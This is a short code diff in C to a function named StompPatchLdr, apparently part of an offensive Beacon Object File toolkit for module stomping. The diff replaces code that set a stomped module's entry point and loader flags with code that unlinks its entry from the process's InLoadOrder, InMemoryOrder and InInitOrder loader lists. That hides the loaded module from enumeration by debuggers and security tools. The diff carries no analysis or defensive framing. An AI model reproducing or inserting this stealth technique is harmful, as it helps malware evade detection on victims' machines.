@@ -21,9 +21,17 @@ static VOID StompPatchLdr( BOF_STOMP_SLOT* slot ) {
     while ( Cur != Head ) {
         PNAX_LDR_ENTRY Entry = (PNAX_LDR_ENTRY)Cur;
         if ( Entry->DllBase == slot->DllBase ) {
-            Entry->EntryPoint = C_PTR( U_PTR( slot->DllBase ) + slot->Nt->OptionalHeader.AddressOfEntryPoint );
-            Entry->Flags     |= LDRP_IMAGE_DLL | LDRP_LOAD_NOTIFICATIONS_SENT |
-                                LDRP_PROCESS_STATIC_IMPORT | LDRP_ENTRY_PROCESSED;
+            Entry->InLoadOrderLinks.Blink->Flink = Entry->InLoadOrderLinks.Flink;
+            Entry->InLoadOrderLinks.Flink->Blink = Entry->InLoadOrderLinks.Blink;
+
+            Entry->InMemoryOrderLinks.Blink->Flink = Entry->InMemoryOrderLinks.Flink;
+            Entry->InMemoryOrderLinks.Flink->Blink = Entry->InMemoryOrderLinks.Blink;
+
+            if ( Entry->InInitOrderLinks.Flink && Entry->InInitOrderLinks.Blink ) {
+                Entry->InInitOrderLinks.Blink->Flink = Entry->InInitOrderLinks.Flink;
+                Entry->InInitOrderLinks.Flink->Blink = Entry->InInitOrderLinks.Blink;
+            }
+
             return;
         }
         Cur = Cur->Flink;
